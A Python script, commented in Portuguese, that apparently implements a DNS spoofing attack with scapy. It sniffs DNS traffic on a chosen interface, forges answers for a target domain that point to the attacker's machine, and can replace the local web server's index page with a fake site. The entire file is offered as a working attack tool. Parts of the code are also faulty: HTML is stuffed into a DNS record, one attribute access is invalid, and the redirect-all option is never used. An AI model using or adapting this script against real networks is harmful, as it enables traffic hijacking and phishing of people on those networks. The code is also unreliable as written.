import socket
import os
from scapy.all import *

def get_local_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.settimeout(0.1)
    try:
        s.connect(('10.255.255.255', 1))
        local_ip = s.getsockname()[0]
    except socket.error:
        local_ip = '127.0.0.1'
    finally:
        s.close()
    return local_ip

def dns_spoof(pkt, target_url, use_custom_html, custom_html_path):
    if DNS in pkt and pkt.haslayer(DNSQR) and pkt.dns.qry_name.decode() == target_url:
        if use_custom_html:
            # Renomeia o index.html original para index.html.bak
            os.rename('/var/www/html/index.html', '/var/www/html/index.html.bak')
            # Lê o conteúdo do arquivo HTML personalizado
            with open(custom_html_path, 'r') as file:
                html_content = file.read()
        else:
            # Se não estiver usando HTML personalizado, use um exemplo simples
            html_content = "<html><body><h1>Site falso</h1></body></html>"

        spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst) / \
                       UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport) / \
                       DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,
                           an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata=get_local_ip()) / DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata=html_content))
        send(spoofed_pkt, verbose=0)

# Obtenha a opção de redirecionar todas as URLs do usuário
redirect_all = input("Deseja redirecionar todas as URLs pesquisadas? (S/N): ").lower() == 's'

# Se não estiver redirecionando todas as URLs, obtenha a URL alvo do usuário
target_url = ""
if not redirect_all:
    target_url = input("Digite a URL alvo para DNS spoofing: ")

# Obtenha a opção de usar HTML personalizado do usuário
use_custom_html = input("Deseja usar um arquivo HTML personalizado? (S/N): ").lower() == 's'

# Se estiver usando HTML personalizado, obtenha o caminho ou nome do arquivo
custom_html_path = ""
if use_custom_html:
    custom_html_path = input("Digite o caminho ou nome do arquivo HTML: ")

# Defina a interface de rede a ser usada
interface = input("Digite a interface de rede: ")

# Filtre o tráfego DNS
sniff(filter="udp and port 53", prn=lambda pkt: dns_spoof(pkt, target_url, use_custom_html, custom_html_path), store=0, iface=interface)